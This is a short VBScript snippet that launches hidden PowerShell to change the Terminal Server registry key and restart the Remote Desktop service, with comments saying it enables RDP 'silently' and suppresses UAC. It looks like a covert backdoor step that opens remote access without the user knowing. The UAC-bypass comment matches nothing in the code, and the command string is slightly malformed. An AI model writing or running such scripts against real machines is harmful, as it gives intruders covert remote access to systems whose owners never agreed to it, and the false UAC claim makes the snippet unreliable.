' Enable RDP silently via WScript.Shell
Set WshShell = CreateObject("WScript.Shell")
' Run PowerShell as admin, suppress UAC via appCompat flag
WshShell.Run "powershell.exe -NoProfile -Command ""Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Restart-Service TermService -Force; Write-Host 'RDP Enabled'""" & " & pause", 0, False
